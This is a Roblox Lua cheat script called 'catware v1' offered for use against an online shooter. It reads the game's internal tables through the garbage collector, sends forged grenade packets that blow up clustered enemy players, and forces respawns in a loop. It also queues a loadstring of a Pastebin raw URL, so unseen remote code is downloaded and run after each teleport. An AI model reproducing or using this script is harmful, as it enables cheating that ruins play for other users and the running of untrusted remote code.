local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local title = Instance.new("TextLabel")
local prisonbreakerv15 = Instance.new("TextButton")
local prisonbreakerv16 = Instance.new("TextButton")
local close = Instance.new("TextButton")
local openmain = Instance.new("Frame")
local open = Instance.new("TextButton")
--Properties:
ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.new(0, 0, 0)
main.Position = UDim2.new(0.0203577988, 0, 0.641277611, 0)
main.Size = UDim2.new(0, 332, 0, 211)
main.Visible = false
main.Active = true
main.Draggable = true

title.Name = "title"
title.Parent = main
title.BackgroundColor3 = Color3.new(1, 0, 1)
title.Size = UDim2.new(0, 332, 0, 31)
title.Font = Enum.Font.GothamBold
title.Text = "coming more soon /MADE BY:0909#3981,Disguised Fox#6736"
title.TextColor3 = Color3.new(0, 0, 0)
title.TextSize = 14

openmain.Name = "openmain"
openmain.Parent = ScreenGui
openmain.BackgroundColor3 = Color3.new(1, 1, 1)
openmain.Position = UDim2.new(0.00801973976, 0, 0.423832953, 0)
openmain.Size = UDim2.new(0, 100, 0, 28)
openmain.Active = true
openmain.Draggable = true

open.Name = "catware v1"
open.Parent = openmain
open.BackgroundColor3 = Color3.new(1, 0, 0)
open.Size = UDim2.new(0, 100, 0, 28)
open.Font = Enum.Font.GothamBold
open.Text = "catware v1"
open.TextColor3 = Color3.new(0, 0, 0)
open.TextSize = 18
open.TextWrapped = true
open.MouseButton1Down:connect(function()
openmain.Visible = false
main.Visible = true
end)

local Toggle = false
local Players = game:GetService("Players")
local Move = game:GetService("Workspace").Map
local ReplicatedStorage = game:GetService("ReplicatedStorage")

Move.Parent = ReplicatedStorage
            game:GetService("Workspace").Gravity = 0

local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end

local camera = workspace.CurrentCamera;
local players = game:GetService("Players");
local localPlayer = players.LocalPlayer;
local charTbl;
local replicationTbl;
local pfCam;
local gameLogic;
local network;
local hud;
local char;
local menu;
local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or function() end
local ts,x = game:GetService("TeleportService")
respawns_before_serverhop = respawns_before_serverhop or 0
local tp = respawns_before_serverhop
if tp == 0 then tp = math.huge end
queueonteleport("if not game:IsLoaded() then wait(3) end respawns_before_serverhop = "..tostring(respawns_before_serverhop).."\nloadstring(game:HttpGet('https://pastebin.com/raw/PyWPzvyL'))()")

game:GetService("Stats").Network.ChildRemoved:Connect(function(disconnected) if disconnected.Name=="ServerStatsItem" then ondisconnect() end end)
task.spawn(function() for i = 1,10 do if not game:GetService("Stats").Network:FindFirstChild("ServerStatsItem") then ondisconnect() return end wait(1) end end)
local things = 0
repeat
things = 0
for i,v in pairs(getgc(true)) do
   if type(v) == "table" then
       if rawget(v, "getbodyparts") then
           replicationTbl = v;
           charTbl = debug.getupvalue(v.getbodyparts, 1);
		   things +=2
       end
       if rawget(v, "basecframe") then
           pfCam = v;
		   things +=1
       end
       if rawget(v, "gammo") then
           gameLogic = v;
		   things +=1
       end
       if rawget(v, "send") then
           network = v;
		   things +=1
       end
       if rawget(v, "updateammo") then
           hud = v;
		   things +=1
       end
       if rawget(v, "jump") then
           char = v;
		   things +=1
       end
       if rawget(v, "isdeployed") then
           menu = v;
		   things +=1
       end
   end
end
wait(1)
until things == 8
local function shootNade(targetPos)
   if gameLogic.gammo <= 0 then
       return;
   end
   local camCf = camera.CFrame;
   local rot = (camCf - camCf.Position);
   local args = {
       time = tick(),
       blowuptime = 0,
       frames = {
           {
               t0 = 0,
               p0 = camCf.Position,
               v0 = camCf.LookVector,
               offset = Vector3.new(),
               a = Vector3.new(0, -80,0),
               rot0 = rot,
               rotv = rot * Vector3.new(19, -5, 0),
               glassbreaks = {}
           },
           {
               t0 = 0,
               p0 = targetPos,
               v0 = Vector3.new(),
               offset = Vector3.new(),
               a = Vector3.new(),
               rot0 = CFrame.new(),
               rotv = Vector3.new(),
               glassbreaks = {}
           }
       }
   };
   network:send("newgrenade", "FRAG", args);
   gameLogic.gammo = gameLogic.gammo - 1;
   hud:updateammo("GRENADE");
end

local function getCharacterInCircle(center, radius)
   local results = {};
   for player, character in pairs(charTbl) do
       if player.Team ~= localPlayer.Team then
           if character.torso and (character.torso.Position - center).Magnitude <= radius then
               results[#results + 1] = character;
           end
       end
   end
   return results;
end


while tp>0 do
  tp-=1
  do
     if not (char.rootpart and menu:isdeployed()) then
         repeat
             menu:deploy();
             task.wait();
         until char.rootpart and menu:isdeployed();
     end
     task.wait(1);
     local targets = {};
     for player, character in pairs(charTbl) do
         if player.Team ~= localPlayer.Team then
             if character.torso and character.head then
                 local charsInCircle = getCharacterInCircle(character.torso.Position, 30);
                 targets[#targets + 1] = charsInCircle;
             end
         end
     end
     table.sort(targets, function(a, b)
         return #a > #b;
     end);
     for i = 1, 3 do
         local t = targets[i];
         if t then
             for j = 1, #t do
                 local theirChar = t[j];
                 if theirChar and theirChar.torso then
                     shootNade(theirChar.torso.Position);
                     task.wait(0.1);
                 end
             end
         end
     end
  end
  network:send("forcereset");
  repeat task.wait() until not menu:isdeployed()
end
ondisconnect()
